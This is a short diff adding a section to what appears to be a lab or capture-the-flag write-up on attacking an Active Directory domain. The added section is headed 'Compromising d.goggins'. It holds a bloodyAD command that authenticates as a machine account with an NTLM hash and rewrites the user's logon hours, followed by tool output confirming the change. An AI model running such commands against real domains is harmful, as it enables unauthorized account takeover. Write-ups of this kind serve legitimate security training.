@@ -574,6 +574,16 @@ logonHours: WRITE
 
 This is where i can modify the logon hours of this account and get access!
 
+# Compromising `d.goggins`
+
+```python
+bloodyAD --host dc01.fragments.local -d fragments.local -u 'prod$' -p ':b43cb2fcadff72ff9136a2f42218c430' set object 'd.goggins' logonhours -v '////////////////////////////' --b64
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+[+] d.goggins's logonHours has been updated
+```
+
+Now his logon hours should be modified!
+
 ```python
 
 ```
